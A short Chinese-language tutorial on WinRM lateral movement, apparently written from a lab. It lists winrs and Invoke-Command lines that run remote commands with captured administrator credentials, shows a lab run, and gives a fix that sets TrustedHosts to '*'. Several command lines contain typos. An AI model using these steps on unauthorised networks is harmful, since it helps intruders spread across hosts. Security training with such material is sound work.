# 利用WinRM远程命令执行横向移动

### 介绍

​	WinRM(Windows远程管理)是Microsoft 在Windows中对WS-Management的实现，它使系统可以跨通用网络访问或交换管理信息。利用脚本对象或内置的命令行工具，WinRM可以与可能具有基板管理控制器(BMC)的任何远程计算机一起使用，以获取数据。也可以获取基于Windows的计算机(包括WinRM).WinRM默认端口5985(HTTP端口)或5986(HTTPS端口)，若配置了WINRM远程服务，当我们拿到一个管理员账户时，可以使用远程连接进行命令执行操作winrm通过HTTP(`5985，server机器默认开启`)或HTTPS SOAP(`5986`)端口来进行通信。

### 原理

​	Winrs.exe是一个内置的命令行工具，他可以使适当的有资格用户允许远程命令执行。可以利用该工具进行横向移动到另一台主机上。

### 命令

```
winrs -r:http://[目标ip]]:5985 -u:zz -p:123.com "ipconfig"
winrs -r:http://[目标ip]:5985-u:机器名\用户名 -p:xxxxx"ipconfig"
winrs -r:https://[目标ip]:5985-u:机器名\用户名 -p:xxxxx"ipconfig"
winrs -r:http://[目标ip]:5985-u:机器名\用户名 -p:xxxxx cmd
winrs -r:https://[目标ip]:5985-u:机器名\用户名 -p:xxxxx cmd
Invoke-Command -ComputerName TARGET -ScriptBlock { dir c:\}
Invoke-Command -ComputerName TARGET -Credential 域名\用户名 -command {Get.Culture}
Invoke-Command -ComputerName TARGET -Credential 城名用户名 -ScriptBlock {Get-
Culture}
```

### 执行

- 尝试在域内机器中执行该命令，但提示报错。

```
winrs -r:http://192.168.211.10:5985 -u:administrator -p:11qq``` "whoami"
```

![](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240704101306321.png)

- 解决办法：输入该命令，出现下图显示即可

```
winrm set winrm/config/Client @{TrustedHosts="*"}   //需管理员权限执行
```

![image-20240704101601205](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240704101601205.png)

- 再次尝试，成功执行命令。

![image-20240704103124229](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240704103124229.png)

